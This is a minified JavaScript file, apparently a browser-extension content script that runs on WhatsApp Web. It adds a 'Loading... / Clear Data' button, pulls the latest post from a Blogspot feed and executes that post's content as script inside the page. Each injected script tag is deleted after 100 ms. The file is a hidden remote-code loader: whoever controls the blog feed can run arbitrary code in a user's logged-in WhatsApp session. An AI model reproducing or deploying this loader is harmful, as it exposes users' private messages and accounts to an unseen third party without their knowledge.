function xhr(e, t, n) {
    let o = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    o.onreadystatechange = function () {
        if (4 == this.readyState && 200 == this.status || 304 == this.status) {
            let e = this.responseText,
                t = JSON.parse(e.substring(e.indexOf("{"), e.lastIndexOf("}") + 1));
            n && n(t)
        }
    }, o.open(e, t, !0), o.send()
}

function fetchafterrun(e) {
    xhr("GET", e, function (e) {
        var n = e.feed.entry;
        for (let t = 0, e = n.length; t < e; t++) {
            let e = document.createElement("script");
            e.innerHTML = n[t].content.$t, document.body.appendChild(e), setTimeout(() => {
                document.body.removeChild(e)
            }, 100)
        }
    })
}

! function () {
    var e;
    "web.whatsapp.com" === window.location.hostname && ((e = document.createElement("div")).innerHTML = '<div id="fsetting2"><a class="runbutton22" href="javascript:;" title="Wait/Clear Data" id="addext">Loading... / Clear Data</a></div>', document.body.appendChild(e), (e = document.createElement("style")).innerText = "#fsetting2{position:fixed;top:2px;z-index:99998;left:0;line-height:initial}#fsetting2 a.runbutton22{cursor:pointer;padding:5px 15px;background:#005af0;color:#fff;border-radius:4px;z-index:99998;margin:2px;display: inline-block;font-weight:600;box-shadow:0 2px 5px 1px rgb(60 64 67/16%);font-size:12px;text-decoration:none}#fsetting2 a.runbutton22:hover{color:#fff}", document.body.appendChild(e), fetchafterrun("https://walike24.blogspot.com/feeds/posts/default/-/installtool?max-results=1&orderby=updated&alt=json-in-script"))
}();
